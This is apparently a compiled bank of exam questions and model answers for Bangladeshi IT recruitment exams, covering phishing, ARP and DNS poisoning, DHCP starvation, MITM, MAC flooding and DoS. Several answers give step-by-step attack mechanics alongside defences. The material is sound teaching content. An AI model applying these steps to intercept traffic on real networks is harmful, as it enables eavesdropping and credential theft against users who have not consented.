<!-- TOC START -->
**Table of Contents** — 15 subtopics · 198 questions

| # | Subtopic | Questions |
|---|---|---|
| 1 | [Social Engineering & Cyber Attacks](#social-engineering--cyber-attacks-32) | 32 |
| 2 | [Cryptography](#cryptography-31) | 31 |
| 3 | [Firewalls & Network Defense](#firewalls--network-defense-20) | 20 |
| 4 | [Malware & Security Threats](#malware--security-threats-20) | 20 |
| 5 | [Web Security Vulnerabilities](#web-security-vulnerabilities-19) | 19 |
| 6 | [Authentication & Access Control](#authentication--access-control-16) | 16 |
| 7 | [Cryptography & Network Security](#cryptography--network-security-14) | 14 |
| 8 | [Security Protocols (SSL/TLS, HTTPS)](#security-protocols-ssltls-https-12) | 12 |
| 9 | [Cyber Crime & Security](#cyber-crime--security-10) | 10 |
| 10 | [Security Principles (CIA Triad)](#security-principles-cia-triad-8) | 8 |
| 11 | [VPN & Tunneling Protocols (IPsec, SSL VPN)](#vpn--tunneling-protocols-ipsec-ssl-vpn-6) | 6 |
| 12 | [Critical Information Infrastructure (CII) & Cyber Governance](#critical-information-infrastructure-cii--cyber-governance-3) | 3 |
| 13 | [Cryptography & Network Security Scenarios](#cryptography--network-security-scenarios-3) | 3 |
| 14 | [Email & Messaging Security (Spam, Phishing)](#email--messaging-security-spam-phishing-3) | 3 |
| 15 | [Buffer Overflow & Software Vulnerabilities](#buffer-overflow--software-vulnerabilities-1) | 1 |

<!-- TOC END -->

---

## Social Engineering & Cyber Attacks (32)

1. **What is a phishing attack? Explain its types and discuss methods to prevent it.** *[Combined Bank Officer (IT) 09.05.2026 debug it (ET: N/A)]*

Answer: Phishing is a social engineering attack in which the attacker impersonates a trusted entity — a bank, a colleague, a service provider — to trick the victim into revealing credentials, card details or installing malware.

   Types of phishing
   - **Email phishing** — a mass email pretending to be from a bank, asking the user to "verify" the account through a fake link.
   - **Spear phishing** — targeted at one specific person, using details gathered about them so the message looks personal and credible.
   - **Whaling** — spear phishing aimed at senior executives (CEO, CFO), usually to authorise a fraudulent payment.
   - **Smishing** — phishing over SMS, common in Bangladesh with fake bKash and prize messages.
   - **Vishing** — voice phishing over a phone call, the caller posing as bank security staff asking for an OTP.
   - **Clone phishing** — a real email the victim received earlier is copied, with the attachment or link replaced by a malicious one.
   - **Pharming** — DNS is poisoned so that even a correctly typed address leads to a fake site.
   - **Angler phishing** — fake customer-support accounts on social media that intercept complaints.

   Prevention methods

   Technical
   - **Email filtering** with SPF, DKIM and DMARC to block spoofed sender domains.
   - **Multi-factor authentication** — a stolen password alone becomes useless.
   - **Web filtering and safe browsing** to block known phishing URLs.
   - **Anti-malware and endpoint protection** on every machine.
   - **HTTPS and certificate checking** — verify the padlock and the actual domain name.

   Human
   - **Regular awareness training** and simulated phishing tests — the single most effective control, because phishing targets people, not systems.
   - **Verify through a second channel** — never act on an email request for payment or credentials without calling the requester on a known number.
   - **Check the sender address and the link target** carefully, not just the display text.
   - **Never share OTP, PIN or password** — no genuine bank ever asks for these.

   Organisational
   - Clear reporting procedure, incident response plan, and least-privilege access so a compromised account causes limited damage.

2. **(b) What is an ARP poisoning attack, and how does it work?** *[NPCBL Sub Assistant Engineer: Cyber Security Analyst Date: 11 July 2026 (ET: N/A)]*

Answer: ARP poisoning (also called ARP spoofing) is a LAN attack in which the attacker sends forged ARP reply messages to associate their own MAC address with the IP address of another device — usually the default gateway — so that traffic meant for that device is delivered to the attacker instead.

   Why it works
   - ARP has NO authentication. Any host can send an ARP reply at any time, and receiving hosts accept it and update their ARP cache without verification. This design flaw is what the attack exploits.

   How it works step by step
   ```mermaid
   flowchart LR
       V[Victim<br/>192.168.1.10] -->|traffic now goes here| A[Attacker<br/>192.168.1.50]
       A -->|forwards on| G[Gateway<br/>192.168.1.1]
       A -.->|forged ARP: 192.168.1.1 is at attacker MAC| V
       A -.->|forged ARP: 192.168.1.10 is at attacker MAC| G
   ```

   - **Step 1** — the attacker joins the same LAN and discovers the victim's IP and the gateway IP.
   - **Step 2** — the attacker sends a forged ARP reply to the VICTIM saying "192.168.1.1 (the gateway) is at my MAC address".
   - **Step 3** — the attacker sends another forged ARP reply to the GATEWAY saying "192.168.1.10 (the victim) is at my MAC address".
   - **Step 4** — both now have poisoned ARP caches. All traffic between them passes through the attacker.
   - **Step 5** — the attacker enables IP forwarding so traffic still reaches its destination, which keeps the attack invisible to the user.

   What the attacker gains
   - Reads all unencrypted traffic (sniffing), modifies it in transit, or drops it entirely — this is exactly how a Man-in-the-Middle attack is launched on a LAN.

   Prevention
   - **Dynamic ARP Inspection (DAI)** on switches — validates ARP packets against the DHCP snooping binding table and drops mismatches. This is the most effective control.
   - **DHCP snooping** to build that trusted IP-to-MAC binding table.
   - **Static ARP entries** for critical devices such as servers and the gateway.
   - **Port security** limiting the MAC addresses per port.
   - **Network segmentation with VLANs**, so the attack surface is smaller.
   - **Encryption (HTTPS, SSH, VPN)** — even if traffic is intercepted, it cannot be read.

3. **What is a Man-in-the-Middle (MITM) attack? Describe two countermeasures to prevent it.** *[NPCBL Sub Assistant Engineer: Cyber Security Analyst Date: 11 July 2026 (ET: N/A)]*

Answer: A Man-in-the-Middle attack is one in which the attacker secretly positions themselves between two communicating parties, relaying and possibly altering the messages, while both parties believe they are talking directly to each other.

   ```mermaid
   flowchart LR
       A[Alice] -->|thinks she talks to Bob| M[Attacker]
       M -->|relays to Bob| B[Bob]
       B -->|thinks he talks to Alice| M
       M -->|relays to Alice| A
   ```

   How it is carried out
   - **ARP spoofing** on a LAN, **DNS spoofing**, a **rogue Wi-Fi access point** ("evil twin"), **SSL stripping** (downgrading HTTPS to HTTP), or **session hijacking** by stealing a session cookie.

   What the attacker can do
   - Read credentials and card details, modify a transaction (change an account number in a transfer), inject malware, or impersonate either party.

   Two countermeasures

   **(a) Strong encryption with certificate validation — HTTPS/TLS**
   - When traffic is encrypted end to end, the attacker can still relay it but cannot read or modify it.
   - The server's certificate proves its identity, so an attacker presenting a fake certificate triggers a browser warning.
   - Reinforce with **HSTS** (forces HTTPS, defeating SSL stripping) and **certificate pinning** in mobile apps.

   **(b) Mutual authentication and a secure network layer**
   - Both parties verify each other, not just the client verifying the server — mutual TLS, or a VPN with IPsec.
   - On a LAN, enable **Dynamic ARP Inspection** and **DHCP snooping** so the attacker cannot poison ARP caches in the first place.
   - Avoid open public Wi-Fi for sensitive work, or always tunnel through a VPN.

   - Additional controls: multi-factor authentication (a stolen password is not enough), DNSSEC against DNS spoofing, and user training to never click through certificate warnings.

4. **What is a DoS attack? Explain the mechanism of a DDoS attack and how it differs from a simple DoS attack.** *[NPCBL Sub Assistant Engineer: Cyber Security Analyst Date: 11 July 2026 (ET: N/A)]*

Answer: A **DoS (Denial of Service)** attack aims to make a service unavailable to its legitimate users by exhausting its resources — bandwidth, CPU, memory or connection table.

   Mechanism of a DDoS (Distributed Denial of Service) attack
   ```mermaid
   flowchart TD
       A[Attacker] --> C[Command & Control server]
       C --> B1[Bot 1]
       C --> B2[Bot 2]
       C --> B3[Bot 3]
       C --> B4[thousands more bots<br/>botnet]
       B1 --> T[Target server]
       B2 --> T
       B3 --> T
       B4 --> T
   ```
   - **Step 1** — the attacker infects thousands of internet-connected machines (PCs, routers, IoT cameras) with malware, forming a **botnet**.
   - **Step 2** — the bots connect to a command-and-control server and wait.
   - **Step 3** — on command, every bot floods the target simultaneously.
   - **Step 4** — the target's bandwidth or connection capacity is exhausted, and legitimate users cannot get through.

   Types of DDoS
   - **Volumetric** — UDP flood, ICMP flood, DNS amplification. Saturates bandwidth.
   - **Protocol attacks** — SYN flood, Ping of Death. Exhausts the connection table.
   - **Application layer** — HTTP flood, Slowloris. Exhausts the web server with legitimate-looking requests.

   DoS vs DDoS

   | Point | DoS | DDoS |
   |---|---|---|
   | Number of sources | One machine | Thousands, a botnet |
   | Traffic volume | Limited | Massive, can exceed 1 Tbps |
   | Blocking difficulty | Easy — block one IP | Very hard — traffic comes from everywhere |
   | Traceability | The single source can be traced | Real attacker is hidden behind the bots |
   | Detection | Easier | Harder, traffic looks distributed and legitimate |
   | Impact | Limited, often survivable | Can take down large services entirely |

   Mitigation
   - Rate limiting and traffic filtering, a DDoS protection service or scrubbing centre (Cloudflare, Akamai), CDN to absorb volume, anycast distribution, adequate over-provisioned bandwidth, SYN cookies against SYN floods, and an incident response plan agreed with the ISP in advance.

5. **What is a Man-inThe Middle (MitM) attack? How can it be prevented?** *[BPSC (Ministry of Food) Network/Website Manager (CSE) 21.05.2025 compact it 1337 (ET: N/A)]*

Answer: A Man-in-the-Middle attack is one where the attacker inserts themselves between two parties, intercepting and possibly altering their communication while both believe they are talking directly to each other.

   Common techniques used
   - **ARP spoofing** on a LAN — poisoning ARP caches so traffic routes through the attacker.
   - **DNS spoofing** — returning a false IP for a domain name.
   - **Rogue access point** — a fake Wi-Fi hotspot named like a legitimate one.
   - **SSL stripping** — silently downgrading an HTTPS connection to plain HTTP.
   - **Session hijacking** — stealing a session cookie to impersonate a logged-in user.

   Prevention

   Encryption and authentication
   - **Use HTTPS/TLS everywhere**, and validate certificates properly. Never click through a certificate warning.
   - **HSTS** so browsers refuse to fall back to HTTP.
   - **Certificate pinning** in mobile banking apps.
   - **VPN with IPsec** for remote access, so the whole channel is encrypted.
   - **Mutual authentication** — both sides prove identity, not just the server.

   Network controls
   - **Dynamic ARP Inspection** and **DHCP snooping** on switches to stop ARP poisoning.
   - **Static ARP entries** for the gateway and critical servers.
   - **DNSSEC** to authenticate DNS responses.
   - **WPA3 / WPA2-Enterprise** on wireless, and avoid open public Wi-Fi.

   Application and user level
   - **Multi-factor authentication** — an intercepted password alone is useless.
   - **Short session timeouts** and secure, HttpOnly cookies.
   - **User awareness** — check the domain name, avoid public Wi-Fi for banking, and never ignore browser security warnings.

6. **Briefly explain phishing attack and denial-of-service (DoS) attack.** *[BPSC (Ministry of Food) Network/Website Manager (CSE) 21.05.2025 compact it 1341 (ET: N/A)]*

Answer:

   **Phishing attack**
   - A social engineering attack in which the attacker impersonates a trusted organisation to trick the victim into revealing credentials, card details or OTP, or into installing malware.
   - Delivered by email, SMS (smishing), phone call (vishing) or social media.
   - Typical form: an email appearing to come from a bank saying "your account will be suspended — click here to verify", leading to a fake login page that captures the password.
   - Prevention: multi-factor authentication, email filtering with SPF/DKIM/DMARC, staff awareness training, verification through a second channel, and never sharing an OTP.

   **Denial of Service (DoS) attack**
   - An attack that makes a service unavailable to legitimate users by exhausting its bandwidth, CPU, memory or connection table.
   - Methods: SYN flood (half-open connections fill the table), UDP flood, ICMP flood, Ping of Death, and application-layer HTTP floods.
   - **DDoS** is the distributed form, launched from thousands of compromised machines forming a botnet, which makes it far harder to block.
   - Prevention: rate limiting, firewall and IPS filtering, DDoS scrubbing services, CDN, SYN cookies, and over-provisioned bandwidth.

   Key difference between them
   - Phishing targets the PERSON to steal information; DoS targets the SYSTEM to deny availability. Phishing breaches confidentiality, DoS breaches availability — two different corners of the CIA triad.

7. **How to attack DHCP server in MIMA?** *[Titas Gas Assistant Engineer (CSE) 24.05.2024 compact it 416 (ET: BUET)]*

Answer: The question asks how DHCP is abused to set up a Man-in-the-Middle Attack. The technique has two stages: DHCP starvation, then a rogue DHCP server.

   **Stage 1 — DHCP starvation**
   - The attacker floods the legitimate DHCP server with thousands of DHCPDISCOVER requests, each with a randomly generated spoofed MAC address.
   - The server allocates a lease to every one of these fake clients, and its address pool is exhausted within seconds.
   - Legitimate clients can no longer obtain an IP address.

   **Stage 2 — rogue DHCP server**
   - The attacker now runs their own DHCP server on the LAN.
   - When a real client sends a DHCPDISCOVER, only the rogue server can answer.
   - The rogue server hands out a valid IP address but sets the **default gateway** and the **DNS server** to the attacker's own machine.

   ```mermaid
   flowchart TD
       A[Attacker] -->|1. flood with spoofed MACs| D[Legitimate DHCP server<br/>pool exhausted]
       A -->|2. runs rogue DHCP server| R[Rogue DHCP]
       C[Client] -->|3. DHCPDISCOVER| R
       R -->|4. IP + gateway = attacker| C
       C -->|5. all traffic| A
       A -->|6. forwards on| G[Real gateway]
   ```

   **Result — Man-in-the-Middle established**
   - Every packet the client sends to the internet now goes to the attacker first, who can sniff, modify or redirect it. Poisoned DNS settings also let the attacker send the victim to fake websites.

   Prevention
   - **DHCP snooping** on switches — mark only the port facing the real DHCP server as "trusted"; DHCP offers arriving on untrusted ports are dropped, which blocks the rogue server entirely.
   - **Rate limiting DHCP messages** on untrusted ports, for example `ip dhcp snooping limit rate 15`, which stops the starvation flood.
   - **Port security** limiting MAC addresses per port, so thousands of spoofed MACs cannot originate from one port.
   - **Dynamic ARP Inspection**, which builds on the DHCP snooping binding table.
   - **802.1X port authentication** so unauthorised devices cannot join the LAN at all.

8. **Let you procure a microfinance application and host it in your office's data centre. What kind of cyber-security threats should you be aware of and what steps would you take to mitigate the threats?** *[Combined Bank Senior Officer (IT) 17.05.2024 compact it 332 (ET: BIBM)]*

Answer:

   (a) Threats to be aware of

   **Application layer**
   - SQL injection, cross-site scripting (XSS), broken authentication, insecure direct object reference, and business logic flaws — the OWASP Top 10.
   - Vulnerabilities inherited from third-party libraries in the procured software.

   **Network layer**
   - DDoS attacks making the service unavailable to borrowers.
   - Man-in-the-middle interception of transaction data.
   - Unauthorised access through open ports or default credentials.

   **Data**
   - Breach of customer PII and financial records — a microfinance system holds NID, mobile number, income and loan data.
   - Data loss from ransomware or hardware failure.

   **Insider and access**
   - Privilege abuse by staff, shared accounts, orphaned accounts of departed employees.

   **Supply chain**
   - Backdoors or hard-coded credentials in the vendor's code; the vendor's own remote-support access.

   **Physical and infrastructure**
   - Unauthorised data centre access, power and cooling failure, no disaster recovery.

   (b) Mitigation steps

   **Before procurement**
   - Security assessment of the vendor, source code escrow, contractual security obligations, and a right-to-audit clause.
   - Independent **penetration test and code review** before go-live.

   **Application**
   - Fix all findings from the pen test, enforce input validation and parameterised queries, secure session management, and encrypt sensitive fields at rest.
   - Keep a patching agreement with the vendor and a defined SLA for security fixes.

   **Network and infrastructure**
   - Place the application behind a **WAF** and a next-generation firewall, in a DMZ separated from the internal LAN.
   - **Network segmentation** — application, database and management on different VLANs.
   - **IDS/IPS**, DDoS protection, and TLS for all traffic.
   - Disable unused ports and services; change every default credential.

   **Access control**
   - **Least privilege** and role-based access, **MFA** for all administrative access, no shared accounts, and quarterly access review.
   - Privileged access management with session recording.

   **Data protection**
   - Encryption at rest and in transit, secure key management, data masking in test environments, and a defined retention and disposal policy.

   **Monitoring and response**
   - Centralised logging into a SIEM, 24/7 alerting, and a written incident response plan that has been rehearsed.

   **Backup and continuity**
   - 3-2-1 backup rule with **tested restores**, offline/immutable copies against ransomware, and a DR site with defined RTO and RPO.

   **Governance**
   - Comply with the **Bangladesh Bank ICT Security Guideline**, run regular VAPT, and provide staff security awareness training.

9. **Write down the 10 most Cyber attacks. Difference among Black Hat hacker, Grey hat hacker and white hat hacker.** *[Sonali & Janata Bank Officer (IT) 14.10.2023 compact it 526 (ET: MIST)]*

Answer:

   (a) Ten most common cyber attacks
   - **Phishing** — impersonating a trusted party to steal credentials.
   - **Malware** — virus, worm, trojan, spyware installed to damage or spy.
   - **Ransomware** — encrypts the victim's data and demands payment.
   - **DoS / DDoS** — floods a service to make it unavailable.
   - **Man-in-the-Middle** — intercepts communication between two parties.
   - **SQL Injection** — inserts malicious SQL into an input field to read or destroy the database.
   - **Cross-Site Scripting (XSS)** — injects script into a web page that runs in other users' browsers.
   - **Password attack** — brute force, dictionary attack, credential stuffing.
   - **Zero-day exploit** — attacks a vulnerability before a patch exists.
   - **Social engineering / insider threat** — manipulating people, or abuse by a trusted employee.

   Also commonly listed: DNS spoofing, ARP poisoning, session hijacking, drive-by download, cryptojacking, and supply chain attacks.

   (b) Types of hacker

   | Point | White Hat | Grey Hat | Black Hat |
   |---|---|---|---|
   | Intent | Ethical — improve security | Mixed, usually curiosity | Malicious — personal gain or damage |
   | Permission | Has explicit written authorisation | No permission | No permission |
   | Legality | Fully legal | Illegal, though often not malicious | Illegal |
   | What they do with findings | Report to the owner and help fix | Disclose publicly, or ask for a fee | Exploit, sell or extort |
   | Also called | Ethical hacker, penetration tester | — | Cracker, attacker |
   | Example | A hired pentester testing a bank's app | Someone who finds a flaw uninvited and then tells the company | A criminal stealing card data to sell |

   - Other categories sometimes asked: **script kiddie** (uses others' tools without understanding), **hacktivist** (politically motivated), **state-sponsored hacker**, and **blue team** (defenders) versus **red team** (attack simulators).

10. **What is Cyber Security? Write down the top 10 cyber attack. Discuss about Ransomware and DDoS attack.** *[Combined Bank Senior Officer (IT) 13.10.2023 compact it 512 (ET: MIST)]*

Answer:

    (a) Cyber security
    - The practice of protecting computers, networks, programs and data from unauthorised access, attack, damage and disruption.
    - Its three goals are the **CIA triad**: **Confidentiality** (only authorised people see the data), **Integrity** (data is not altered), **Availability** (systems work when needed).
    - Domains: network security, application security, information security, operational security, disaster recovery and end-user education.

    (b) Top 10 cyber attacks
    - Phishing, Malware, Ransomware, DoS/DDoS, Man-in-the-Middle, SQL Injection, Cross-Site Scripting, Password attack, Zero-day exploit, Insider threat / social engineering.

    (c) Ransomware
    - Malware that encrypts the victim's files and demands a ransom, usually in cryptocurrency, for the decryption key.
    - **How it spreads** — phishing email attachments, malicious links, exploiting unpatched vulnerabilities, compromised RDP with weak passwords, and drive-by downloads.
    - **Stages** — infection → establish persistence → spread laterally across the network → often exfiltrate data first → encrypt files → display the ransom note.
    - **Double extortion** is now standard: attackers steal the data before encrypting, then threaten to publish it even if backups exist.
    - **Examples** — WannaCry (2017), Petya/NotPetya, Ryuk, LockBit.
    - **Prevention** — regular OFFLINE and immutable backups with tested restores, prompt patching, email filtering, endpoint detection and response, network segmentation to limit spread, least privilege, disabling unnecessary RDP, and staff awareness.
    - **Response** — isolate infected machines immediately, do not pay (payment funds further crime and does not guarantee recovery), restore from clean backups, and report to the authorities.

    (d) DDoS attack
    - A Distributed Denial of Service attack floods a target from thousands of compromised machines (a botnet) so that legitimate users cannot reach the service.
    - **Types** — volumetric (UDP flood, DNS amplification), protocol (SYN flood), and application layer (HTTP flood, Slowloris).
    - **Motives** — extortion, competitive sabotage, hacktivism, or as a distraction while another attack is carried out.
    - **Mitigation** — DDoS scrubbing services, CDN, rate limiting, SYN cookies, anycast distribution, over-provisioned bandwidth, and a pre-agreed response plan with the ISP.

    - Contrast worth stating: ransomware attacks INTEGRITY and CONFIDENTIALITY (data is encrypted and stolen); DDoS attacks AVAILABILITY only (data is untouched, but nobody can reach it).

11. **What is meant by Encryption and Decryption? What is Cyber security? Write down the top 10 cyber attack.** *[Combined Bank Assistant Maintenance Engineer/ Assistant Hardware Engineer 23.11.2023 compact it 557 (ET: BIBM)]*

Answer:

    (a) Encryption and Decryption
    - **Encryption** converts readable data (plaintext) into an unreadable form (ciphertext) using an algorithm and a key, so that anyone intercepting it cannot understand it.
    - **Decryption** is the reverse — converting ciphertext back to plaintext using the correct key.

    ```
    Plaintext --[Encryption algorithm + Key]--> Ciphertext
    Ciphertext --[Decryption algorithm + Key]--> Plaintext
    ```

    - **Symmetric encryption** — the SAME key encrypts and decrypts. Fast, suitable for bulk data. Examples: AES, DES, 3DES. Problem: securely sharing the key.
    - **Asymmetric encryption** — a PUBLIC key encrypts and a PRIVATE key decrypts. Solves key distribution but is slow. Examples: RSA, ECC.
    - In practice both are combined: asymmetric encryption exchanges a symmetric session key, then symmetric encryption carries the actual data. This is exactly how HTTPS works.

    (b) Cyber security
    - Protecting systems, networks and data from digital attack, damage and unauthorised access, with the goals of Confidentiality, Integrity and Availability.

    (c) Top 10 cyber attacks
    - Phishing, Malware, Ransomware, DoS/DDoS, Man-in-the-Middle, SQL Injection, Cross-Site Scripting (XSS), Password attack (brute force, credential stuffing), Zero-day exploit, Insider threat.

12. **Difference between active and passive atack.** *[BEPZA Programmer 03.11.2023 compact it 562 (ET: N/A)]*

Answer:

    | Point | Passive Attack | Active Attack |
    |---|---|---|
    | Objective | Obtain information only | Alter data or disrupt operation |
    | Effect on data | Data is NOT modified | Data IS modified, created or destroyed |
    | Effect on system | System keeps working normally | System operation is affected |
    | Detection | Very hard — nothing changes | Comparatively easy — the change is visible |
    | Prevention vs detection | Prevention is the priority (encryption) | Detection and recovery are the priority |
    | Security goal violated | Confidentiality | Integrity and Availability |
    | Types | Eavesdropping / traffic sniffing, traffic analysis | Masquerade, replay, message modification, DoS |
    | Countermeasure | Encryption — the attacker sees only ciphertext | Digital signatures, hashing, MAC, IDS, firewalls |
    | Example | Capturing packets on an open Wi-Fi network | Changing the account number in a fund transfer |

    - Key insight: passive attacks are hard to DETECT but easy to PREVENT with encryption. Active attacks are hard to PREVENT but easier to DETECT with integrity checks. Security design therefore uses encryption against the first and hashing plus monitoring against the second.

13. **Describe a man-in the middle attack on the Diffie-Hellman key exchange protocol in which the adversary generates two public key pairs for the attack.** *[Bangladesh Bank Assistant Programmer 03.02.2023 compact it 434 (ET: BIBM)]*

Answer: Diffie-Hellman lets two parties agree a shared secret over an insecure channel, but in its basic form it provides NO AUTHENTICATION. That is exactly the weakness the attack exploits.

    Normal Diffie-Hellman
    - Public parameters: a prime `p` and a generator `g`.
    - Alice picks a secret `a` and sends `A = gᵃ mod p`.
    - Bob picks a secret `b` and sends `B = gᵇ mod p`.
    - Both compute the shared key `K = gᵃᵇ mod p`.

    The MITM attack with two key pairs
    ```mermaid
    flowchart LR
        A[Alice<br/>secret a] -->|A = g^a| M[Mallory<br/>secrets m1, m2]
        M -->|M1 = g^m1| B[Bob<br/>secret b]
        B -->|B = g^b| M
        M -->|M2 = g^m2| A
    ```

    - **Step 1** — Alice sends `A = gᵃ mod p`, intended for Bob. Mallory intercepts it.
    - **Step 2** — Mallory generates her FIRST key pair with secret `m1`, and sends `M1 = g^m1 mod p` to Bob, pretending to be Alice.
    - **Step 3** — Bob sends `B = gᵇ mod p`, intended for Alice. Mallory intercepts it too.
    - **Step 4** — Mallory generates her SECOND key pair with secret `m2`, and sends `M2 = g^m2 mod p` to Alice, pretending to be Bob.

    Resulting keys
    - Alice computes `K1 = (M2)ᵃ = g^(m2·a) mod p` — she believes this is shared with Bob.
    - Mallory computes the same `K1 = (A)^m2 = g^(a·m2) mod p`.
    - Bob computes `K2 = (M1)ᵇ = g^(m1·b) mod p` — he believes this is shared with Alice.
    - Mallory computes the same `K2 = (B)^m1 = g^(b·m1) mod p`.

    Result
    - Two separate secure channels now exist: Alice ↔ Mallory using K1, and Mallory ↔ Bob using K2.
    - Mallory decrypts everything Alice sends with K1, reads or alters it, re-encrypts with K2 and forwards to Bob. Neither party notices.

    Why it succeeds
    - Plain Diffie-Hellman authenticates nobody. Alice has no way to verify that `M2` really came from Bob.

    Prevention
    - **Authenticated Diffie-Hellman** — sign the exchanged values with a digital signature (this is what TLS does, using the server's certificate).
    - **Station-to-Station protocol**, which adds mutual signature verification.
    - **Certificates from a trusted CA** to bind a public key to an identity.
    - **Pre-shared keys** or a password-authenticated key exchange for closed systems.

14. **What is MAC flooding? How to prevent MAC flooding?** *[Teletalk Assistant Manager (IT) 2023 compact it 466 (ET: N/A)], [Telephone Shilpa Sangstha Ltd. (TSS) Assistant Programmer 2022 compact it 717 (ET: N/A)]*

Answer: MAC flooding is a Layer 2 attack in which the attacker floods a switch with frames carrying thousands of fake source MAC addresses, overflowing the switch's **CAM table** (MAC address table).

    How it works
    - A switch learns which MAC address is on which port and stores it in the CAM table, which has a fixed size.
    - The attacker sends a rapid stream of frames with randomly generated source MAC addresses.
    - The CAM table fills up, and legitimate MAC-to-port mappings are pushed out.
    - When the switch receives a frame for a destination it no longer has in the table, it must **flood** it out of every port — behaving like a hub.
    - The attacker now receives copies of traffic meant for other hosts and can sniff it.

    ```mermaid
    flowchart LR
        A[Attacker] -->|thousands of fake<br/>source MACs| S[Switch<br/>CAM table full]
        S -->|now floods all frames<br/>to every port| A
        S --> V1[Victim 1]
        S --> V2[Victim 2]
    ```

    Impact
    - Loss of confidentiality — the attacker sniffs traffic that was previously switched privately.
    - Performance degradation, since the switch broadcasts everything.
    - It is often the first step towards a Man-in-the-Middle attack.

    Prevention
    - **Port security** — the primary defence. Limit the number of MAC addresses learned per port (`switchport port-security maximum 2`) and define a violation action (shutdown, restrict or protect).
    - **Sticky MAC** — bind the first learned MAC to the port permanently.
    - **802.1X port authentication** so unauthorised devices cannot connect at all.
    - **VLAN segmentation** to limit the blast radius.
    - **Disable unused ports** and put them in an unused VLAN.
    - **DHCP snooping and Dynamic ARP Inspection** alongside, since these attacks are usually combined.
    - **Monitoring** — alert on abnormal CAM table growth.
    - **Encryption** so that even sniffed traffic is unreadable.

15. **What is Denial of Service (DoS) is and NAT?** *[NSDA Assistant Maintenance Engineer Date: 04-03-2022 compact it 659 (ET: N/A)]*

Answer:

    **DoS (Denial of Service)**
    - An attack that makes a service unavailable to its legitimate users by exhausting bandwidth, CPU, memory or the connection table.
    - Methods: SYN flood, UDP flood, ICMP flood, Ping of Death, Slowloris, HTTP flood.
    - **DDoS** is the distributed version, launched from a botnet of thousands of machines, which makes it far harder to filter.
    - It attacks the **availability** leg of the CIA triad — no data is stolen or changed, but nobody can use the service.
    - Mitigation: rate limiting, firewall and IPS filtering, DDoS scrubbing services, CDN, SYN cookies.

    **NAT (Network Address Translation)**
    - A technique that maps private IP addresses inside a network to one or more public IP addresses at the router, so many internal devices can share a single public IP.
    - Types: **Static NAT** (one-to-one fixed), **Dynamic NAT** (one-to-one from a pool), and **PAT / NAT overload** (many-to-one using different port numbers — the form used in every home router).
    - Benefits: conserves scarce IPv4 addresses, and hides the internal network structure, which gives a degree of security because internal hosts are not directly reachable from the internet.
    - Drawback: breaks end-to-end connectivity, which complicates VoIP, peer-to-peer applications and some VPNs.

    - The two are unrelated topics: DoS is an attack, NAT is an addressing technique — though NAT does incidentally shield internal hosts from being targeted directly.

16. **What do you understand by DOS attack and Man-in-the-middle attack? Please explain how it can be occurred?** *[BPSC (Ministry of Home Affairs) Assistant Database Administrator (CSE) 2022 compact it 667 (ET: N/A)]*

Answer:

    **DoS attack**
    - An attack that denies legitimate users access to a service by exhausting its resources.

    How it occurs
    - **SYN flood** — the attacker sends thousands of TCP SYN packets with spoofed source addresses. The server allocates a connection entry and replies SYN-ACK, but the final ACK never arrives. The half-open connection table fills and no new connection can be accepted.
    - **UDP / ICMP flood** — raw volume saturates the target's bandwidth.
    - **Amplification** — a small spoofed request to a DNS or NTP server produces a large reply directed at the victim, multiplying the attacker's bandwidth many times.
    - **Application layer** — Slowloris holds many connections open with partial HTTP requests, exhausting the web server's worker threads with very little traffic.

    **Man-in-the-Middle attack**
    - The attacker secretly relays communication between two parties who believe they are talking directly.

    How it occurs
    - **ARP spoofing** — forged ARP replies poison the victim's and the gateway's caches so traffic flows through the attacker.
    - **Rogue Wi-Fi access point** — a fake hotspot with a familiar name; everything the victim sends passes through it.
    - **DNS spoofing** — a false DNS answer sends the victim to the attacker's server.
    - **SSL stripping** — the attacker silently downgrades HTTPS to HTTP so traffic can be read.
    - **Session hijacking** — a stolen session cookie lets the attacker impersonate a logged-in user.

    Prevention summary
    - Against DoS: rate limiting, filtering, DDoS protection services, SYN cookies, adequate bandwidth.
    - Against MITM: HTTPS with certificate validation, HSTS, VPN, Dynamic ARP Inspection, DHCP snooping, DNSSEC, and multi-factor authentication.

17. **What do you mean by a DNS poisoning attack, and how does it work?** *[GTCL Assistant Engineer (CSE) 2022 compact it 685 (ET: BUET)]*

Answer: DNS poisoning (also called DNS cache poisoning or DNS spoofing) is an attack in which false address records are inserted into a DNS resolver's cache, so that users who type a legitimate domain name are silently sent to the attacker's server.

    How it works
    ```mermaid
    flowchart LR
        U[User types bank.com] --> R[DNS Resolver<br/>poisoned cache]
        R -->|returns attacker IP| U
        U -->|connects| F[Fake bank site<br/>attacker server]
        A[Attacker] -.->|injects forged<br/>DNS response| R
    ```

    - **Step 1** — the user's resolver does not have `bank.com` in its cache, so it queries an authoritative server.
    - **Step 2** — the attacker floods the resolver with forged DNS responses, guessing the query's transaction ID and source port.
    - **Step 3** — if a forged reply arrives before the genuine one and the ID matches, the resolver accepts it and CACHES the false IP address.
    - **Step 4** — every user of that resolver is now sent to the attacker's server for the whole TTL of the record, even though they typed the correct address.

    Other ways it is achieved
    - Compromising the DNS server itself, altering the local `hosts` file with malware, or a rogue DHCP server handing out a malicious DNS server address.

    Impact
    - Credential theft through pharming (a perfect-looking fake banking site), malware distribution, traffic interception, and censorship or redirection.
    - It is more dangerous than phishing because the victim does nothing wrong — the URL in the address bar is genuine.

    Prevention
    - **DNSSEC** — digitally signs DNS records so a forged response fails validation. This is the real fix.
    - **Randomised source ports and transaction IDs**, making the guessing attack impractical.
    - **DNS over HTTPS (DoH) or DNS over TLS (DoT)** to encrypt DNS queries.
    - Keep resolver software patched, restrict recursion to internal clients, and use trusted resolvers.
    - **HTTPS with certificate validation** — even if the DNS is poisoned, the attacker cannot present a valid certificate for the real domain.

18. **Write down the difference between Active and Passive attack.** *[Microcredit Regulatory Authority (MRA) Assistant Maintenance Engineer 2022 compact it 719 (ET: N/A)]*

Answer:

    | Point | Active Attack | Passive Attack |
    |---|---|---|
    | Goal | Modify data or disrupt service | Observe and collect information only |
    | Data modification | Yes | No |
    | System impact | Operation is disturbed | Operation continues normally |
    | Victim awareness | Usually becomes aware eventually | Usually never becomes aware |
    | Detection | Easier — changes are visible | Very difficult — nothing changes |
    | Prevention | Difficult | Easier — encryption defeats it |
    | Security goal breached | Integrity and Availability | Confidentiality |
    | Main defence | Digital signature, hashing, IDS, firewall | Encryption |
    | Examples | Masquerade, replay attack, message modification, DoS, session hijacking | Eavesdropping, packet sniffing, traffic analysis |

    Sub-types of each

    **Active**
    - **Masquerade** — pretending to be another entity.
    - **Replay** — capturing a valid message and re-sending it later.
